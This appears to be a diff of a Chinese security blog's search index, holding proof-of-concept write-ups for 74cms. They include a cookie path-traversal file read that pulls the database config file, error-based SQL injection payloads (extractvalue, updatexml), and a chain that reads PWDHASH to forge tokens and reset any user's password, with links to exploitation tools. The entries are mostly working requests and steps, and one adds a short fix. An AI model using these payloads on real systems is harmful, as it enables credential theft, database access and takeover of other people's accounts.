+        <category>Poc</category>
+      </categories>
+      <tags>
+        <tag>74cms</tag>
       </tags>
   </entry>
   <entry>
@@ -212,140 +376,41 @@ members_bind_info[type][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select us
       </tags>
   </entry>
   <entry>
-    <title>74cms v4.2.126-任意文件读取漏洞</title>
-    <url>/2021/01/12/74cms%20v4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="74cms-v4-2-126-任意文件读取漏洞"><a href="#74cms-v4-2-126-任意文件读取漏洞" class="headerlink" title="74cms v4.2.126-任意文件读取漏洞"></a>74cms v4.2.126-任意文件读取漏洞</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>厂商：74cms下载<a id="more"></a>地址：<a href="http://www.74cms.com/download/index.html%E5%85%B3%E4%BA%8E%E7%89%88%E6%9C%AC%EF%BC%9A%E6%96%B0%E7%89%88%E7%9A%8474cms%E9%87%87%E7%94%A8%E4%BA%86tp3.2.3%E9%87%8D%E6%9E%84%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E7%9F%A5%E5%BA%95%E5%B1%82%E6%98%AFtp%EF%BC%8C74cms%E6%96%B0%E7%89%88%E5%8D%87%E7%BA%A7%E6%98%AF%E5%90%8E%E5%8F%B0%E5%8D%87%E7%BA%A7%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E5%85%88%E5%B0%86%E5%B0%86%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95%E3%80%82%E6%B3%A8%EF%BC%9A%E6%AD%A4%E6%BC%8F%E6%B4%9E%E4%B8%8D%E7%94%A8%E5%8D%87%E7%BA%A7%E8%87%B3%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%B9%9F%E5%8F%AF%E4%BD%BF%E7%94%A8%E3%80%82">http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。</a></p>
-<h2 id="0x01-74cms升级到最新版"><a href="#0x01-74cms升级到最新版" class="headerlink" title="0x01 74cms升级到最新版"></a>0x01 74cms升级到最新版</h2><p>1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，<br>搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[&#39;HTTP_HOST&#39;] 改为 <a href="http://baidu.com/">http://baidu.com</a> 即可</p>
-<h2 id="0x02-任意文件读取漏洞演示"><a href="#0x02-任意文件读取漏洞演示" class="headerlink" title="0x02 任意文件读取漏洞演示"></a>0x02 任意文件读取漏洞演示</h2><pre><code>url: http://74cms.test/index.php?m=Home&amp;c=Members&amp;a=register
-
-post: 
-reg_type=2&amp;utype=2&amp;org=bind&amp;ucenter=bind
-cookie: members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php;members_bind_info[type]=qq;members_uc_info[password]=123456;members_uc_info[uid]=1;members_uc_info[username]=tttttt;
-headers:
+    <title>74cms v4.2.3任意文件读取</title>
+    <url>/2021/01/12/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
+    <content><![CDATA[<h1 id="74cms-v4-2-3任意文件读取"><a href="#74cms-v4-2-3任意文件读取" class="headerlink" title="74cms v4.2.3任意文件读取"></a>74cms v4.2.3任意文件读取</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>74cms v4.2.3<a id="more"></a></p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>先尝试读取 db.php，向服务器post如下数据</p>
+<pre><code>POST /index.php?m=&amp;c=members&amp;a=register HTTP/1.1
+Host: www.0-sec.org
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Cookie: members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php; members_bind_info[type]=qq; members_uc_info[password]=xcxmiku; members_uc_info[uid]=123456; members_uc_info[username]=xcxmiku
 Content-Type: application/x-www-form-urlencoded
-X-Requested-With: XMLHttpRequest</code></pre>
-<p><img src="/images/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
-<p><img src="/images/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
-<p><img src="/images/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
-<p><img src="/images/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
-<p>问题一：漏洞原理？我下面会讲问题二：你如何知道文件名称的？我下面会讲问题三：能不能写个简单的工具，自动利用此漏洞？哦，好的，我下面会提供 : )</p>
-<h2 id="0x03-漏洞讲解"><a href="#0x03-漏洞讲解" class="headerlink" title="0x03 漏洞讲解"></a>0x03 漏洞讲解</h2><p>打开文件：74cms\upload\Application\Home\Controller\MembersController.class.php函数：_save_avatar($avatar, $uid)</p>
-<p><img src="/images/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
-<p>如果不想看图片注释的话，我这里简单的说一下。812行使用$avatar拼接形成$path830行使用了$save_avatar+$savePicName; 生成了$filename838行，使用了copy函数，把$path文件内容复制到了$filename中。而 $avatar 和 $uid 都是我们刚好可以控制的变量并且生成的文件名称是$uid+time() 然后md5 一下 拼接 .jpg这个情况就很舒服了。写个小工具跑一下就好了，小工具会在结尾的时候放出来的。好了，让我们继续看下去 : )我们现在既然已经知道了_save_avatar<br>函数是有可能造成此漏洞的那么这时，我们就需要去找调用它的地方了。经过一顿的搜索我们得出了两个地方是调用了他地方一：register() 方法 会员注册方法地方二：oauth_reg() 方法 第三方登录注册方法论此漏洞的利用当然是register() 方法利用起来比较简单 因为 方法二<br>需要搭建第三方登录，我本地的话。。。还是算了，这里掩饰我使用 方法一打开文件：74cms\upload\Application\Home\Controller\MembersController.class.php函数：register()</p>
-<p><img src="/images/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId30.png"></p>
-<p>上面的马赛克是因为我写错了几个字，又不想重新写，所以我就把他擦掉了。皮这一下，我就很开心</p>
-<p><img src="/images/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId31.png"></p>
-<p>这里我们讲解一下如果<br>post的变量ucenter为bind时，则通过cookie获取数组$uc_user接着会进行数组合并而members_uc_info的cookie值是可控的，所以$data也是可控的。</p>
-<p><img src="/images/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId32.png"></p>
-<p>这里写着 当 $data[utype] = 1<br>会进行用户注册，而$data[utype]是我们可以控制的所以我们为2绕过此判断这里我又跳过了前面一些无关紧要的内容，来到了最后的漏洞触发点。因为真的无关紧要,所以就跳过了</p>
-<p><img src="/images/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId33.png"></p>
-<h2 id="0x04-漏洞利用小工具"><a href="#0x04-漏洞利用小工具" class="headerlink" title="0x04 漏洞利用小工具"></a>0x04 漏洞利用小工具</h2><p><a href="https://github.com/ianxtianxt/74cms-upload">https://github.com/ianxtianxt/74cms-upload</a></p>
-<p><img src="/images/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId35.png"></p>
-<p><img src="/images/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId36.png"></p>
-<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
-<p><a href="https://www.yuque.com/pmiaowu/bfgkkh/dr895b">https://www.yuque.com/pmiaowu/bfgkkh/dr895b</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>Poc</category>
-      </categories>
-      <tags>
-        <tag>74cms</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>74cms v4.2.126-通杀sql注入</title>
-    <url>/2021/01/12/74cms%20v4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="74cms-v4-2-126-通杀sql注入"><a href="#74cms-v4-2-126-通杀sql注入" class="headerlink" title="74cms v4.2.126-通杀sql注入"></a>74cms v4.2.126-通杀sql注入</h1><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>厂商：74cms下载地址：<a href="http://www.74cms.com/download/index.html">http://www.74cms.com/download/index.html</a></p>
-<p>关于版本：新版<a id="more"></a>的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。</p>
-<p>注：此漏洞不用升级至最新版本也可使用。</p>
-<h1 id="0x01-74cms升级到最新版"><a href="#0x01-74cms升级到最新版" class="headerlink" title="0x01 74cms升级到最新版"></a>0x01 74cms升级到最新版</h1><p>1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，<br>搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[&#39;HTTP_HOST&#39;] 改为  <a href="http://baidu.com/">http://baidu.com</a> 即可</p>
-<h1 id="0x02-数据填充不然没得测试"><a href="#0x02-数据填充不然没得测试" class="headerlink" title="0x02 数据填充不然没得测试"></a>0x02 数据填充不然没得测试</h1><p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId26.png"></p>
-<h2 id="0x02-1注册商家账号方便测试"><a href="#0x02-1注册商家账号方便测试" class="headerlink" title="0x02.1注册商家账号方便测试"></a>0x02.1注册商家账号方便测试</h2><p>首先先注册一个商家用户然后发布一条消息，注册商家直接去后台注册最简单了注册完成以后将此商家用户登录前台</p>
-<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId28.png"></p>
-<h2 id="0x02-2注册普通账号方便测试"><a href="#0x02-2注册普通账号方便测试" class="headerlink" title="0x02.2注册普通账号方便测试"></a>0x02.2注册普通账号方便测试</h2><p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId30.png"></p>
-<h1 id="0x03-sql漏洞演示"><a href="#0x03-sql漏洞演示" class="headerlink" title="0x03 sql漏洞演示"></a>0x03 sql漏洞演示</h1><p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId32.png"></p>
-<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId33.png"></p>
-<p>这样的话只要点击完以后有数据 你在 lat  lng  字段都可以正常的进行注入</p>
-<pre><code>Payload: 
-http://74cms.test/index.php?m=&amp;c=jobs&amp;a=jobs_list&amp;lat=23.176465&amp;range=20&amp;lng=113.35038 PI() / 180 - map_x  PI() / 180) / 2),2))) * 1000) AS map_range FROM qs_jobs_search j WHERE (extractvalue (1,concat(0x7e,(SELECT USER()), 0x7e))) -- a</code></pre>
-<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId34.png"></p>
-<h1 id="0x04-漏洞原理"><a href="#0x04-漏洞原理" class="headerlink" title="0x04 漏洞原理"></a>0x04 漏洞原理</h1><p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId36.png"></p>
-<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId37.png"></p>
-<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId38.png"></p>
-<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId39.png"></p>
-<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId40.png"></p>
-<p>16.png</p>
-<p>说明我们的猜想是没有错的。</p>
-<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId41.png"></p>
-<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId42.png"></p>
-<p>所以最终我们符合条件的内容都会赋值为$this-&gt;params</p>
-<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId43.png"></p>
-<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId44.png"></p>
-<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId45.png"></p>
-<h1 id="0x05-修复方法"><a href="#0x05-修复方法" class="headerlink" title="0x05 修复方法"></a>0x05 修复方法</h1><p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId47.png"></p>
-<pre><code>$this-&gt;field = &quot;id,ROUND(6378.138*2*ASIN(SQRT(POW(SIN((&quot;.floatval($this-&gt;params[&#39;lat&#39;]).&quot;*PI()/180-map_y*PI()/180)/2),2)+COS(&quot;.floatval($this-&gt;params[&#39;lat&#39;]).&quot;*PI()/180)*COS(map_y*PI()/180)*POW(SIN((&quot;.floatval($this-&gt;params[&#39;lng&#39;]).&quot;*PI()/180-map_x*PI()/180)/2),2)))*1000) AS map_range&quot;;</code></pre>
-<p>强转为浮点型，防止注入</p>
-<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
-<p><a href="https://www.yuque.com/pmiaowu/bfgkkh/iwgmb2">https://www.yuque.com/pmiaowu/bfgkkh/iwgmb2</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>Poc</category>
-      </categories>
-      <tags>
-        <tag>74cms</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞</title>
-    <url>/2021/01/12/74cms%20v4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="74cms-v4-2-126-因任意文件读取漏洞导致的任意用户密码修改漏洞"><a href="#74cms-v4-2-126-因任意文件读取漏洞导致的任意用户密码修改漏洞" class="headerlink" title="74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞"></a>74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>厂商：74cms下载<a id="more"></a>地址：<a href="http://www.74cms.com/download/index.html%E5%85%B3%E4%BA%8E%E7%89%88%E6%9C%AC%EF%BC%9A%E6%96%B0%E7%89%88%E7%9A%8474cms%E9%87%87%E7%94%A8%E4%BA%86tp3.2.3%E9%87%8D%E6%9E%84%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E7%9F%A5%E5%BA%95%E5%B1%82%E6%98%AFtp%EF%BC%8C74cms%E6%96%B0%E7%89%88%E5%8D%87%E7%BA%A7%E6%98%AF%E5%90%8E%E5%8F%B0%E5%8D%87%E7%BA%A7%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E5%85%88%E5%B0%86%E5%B0%86%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95%E3%80%82%E6%B3%A8%EF%BC%9A%E6%AD%A4%E6%BC%8F%E6%B4%9E%E4%B8%8D%E7%94%A8%E5%8D%87%E7%BA%A7%E8%87%B3%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%B9%9F%E5%8F%AF%E4%BD%BF%E7%94%A8%E3%80%820x01">http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。0x01</a> 74cms升级到最新版1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，<br>搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[&#39;HTTP_HOST&#39;] 改为 <a href="http://baidu.com/">http://baidu.com</a> 即可</p>
-<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>突突突突突突突文件：74cms\upload\Application\Home\Controller\ApiController.class.php方法：members_edit(</p>
-<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId23.png"></p>
-<p>从这里看漏洞整体都很简单。没有过多的套路的，有的只是中规中矩。那么就让我们直接利用试试。</p>
-<p>先看看数据库现在的数据</p>
-<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
-<p>接着让我们来调接口看看</p>
-<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
-<p>文件：<br>74cms\upload\Application\Home\Controller\ApiController.class.php方法：check_token(</p>
-<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
-<p>接口调用失败的原因是因为，上图的析构函数调用了方法 check_token 进行了token验证</p>
-<p>这些都没有问题，$token 也是我们可以操控的。</p>
-<p>现在的问题就是C(&#39;PWDHASH&#39;) 我们现在无法得到。</p>
-<p>好在，我们还可以通过组合漏洞的形式来获取。</p>
-<p>想要利用此漏洞，我的想法是先通过，任意读取漏洞，先把C(&#39;PWDHASH&#39;)<br>的值读取出来，然后在加密验证一下即可</p>
-<p>而加密的代码其实我们不需要去看，因为这是全局通用的代码，所以我们正式环境中复制出来加密一下就可以利用了。</p>
-<p>思路：先下载此源码然后本地把此加密函数保存下来即可。（因为没人会没事去改加密函数）然后在通过 “任意文件读取漏洞” 读取目标站点的C(&#39;PWDHASH&#39;)<br>的值，接着本地加密成token这样漏洞就可以使用了</p>
-<p>任意文件读取的小脚本下载</p>
-<p><a href="https://github.com/ianxtianxt/74cms/_file/_read">https://github.com/ianxtianxt/74cms\_file\_read</a></p>
-<p>下载此文件以后</p>
-<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
-<p>设置成这样，然后执行一下</p>
-<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId28.png"></p>
-<p>接着把 PWDHASH 复制出来</p>
-<p>我们这里看看加密的代码：文件：74cms\upload\Application\Common\Common\function.php函数：encrypt(</p>
-<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
-<p>然后加密一下</p>
-<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId30.png"></p>
-<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId31.png"></p>
-<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId32.png"></p>
-<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId33.png"></p>
-<p>这时你就会发现虽然我们密码改了但是不知道用户名怎么办？</p>
-<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId34.png"></p>
-<p>好在我们可以这样利用！人家登录是可以用户名，手机号登录的，所以我们就</p>
-<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId35.png"></p>
-<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId36.png"></p>
-<p>当然如果你要修改用户名登录的话，也可以，看你自己喜欢了</p>
-<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId37.png"></p>
-<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId38.png"></p>
-<h2 id="0x03-利用小工具"><a href="#0x03-利用小工具" class="headerlink" title="0x03 利用小工具"></a>0x03 利用小工具</h2><p>为了方便大家，手工做这种事情是很累的，所以还是要写个小工具，可以方便的去利用。利用工具:</p>
-<p><a href="https://github.com/ianxtianxt/74cms/_file/_read">https://github.com/ianxtianxt/74cms\_file\_read</a></p>
-<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId40.png"></p>
-<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId41.png"></p>
-<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
-<p><a href="https://www.yuque.com/pmiaowu/bfgkkh/rymscc">https://www.yuque.com/pmiaowu/bfgkkh/rymscc</a></p>
-</blockquote>
+
+ajax=1&amp;reg_type=2&amp;utype=2&amp;org=bind&amp;ucenter=bind</code></pre>
+<p>会返回如下数据</p>
+<p>1.png</p>
+<p>在/data/upload/avatar/年月/日文件夹下 会生成一张图片</p>
+<p>2.png</p>
+<p>这张图片的名称由id和时间戳的md5值构成，我们可以将Burp<br>Suite上返回的时间转换为时间戳</p>
+<p>3.png</p>
+<p>不过这个时间可能会有误差，如果不行就把时间+-10</p>
+<p>我post的id为654321，获取的时间戳为1571659588，将他们连在一起进行md5加密</p>
+<p>4.png</p>
+<p>成功获取图片名，然后访问</p>
+<pre><code>https://www.0-sec.org/data/upload/avatar/1910/21/9aaa3653bf6ec9491bc002b52521962c.jpg </code></pre>
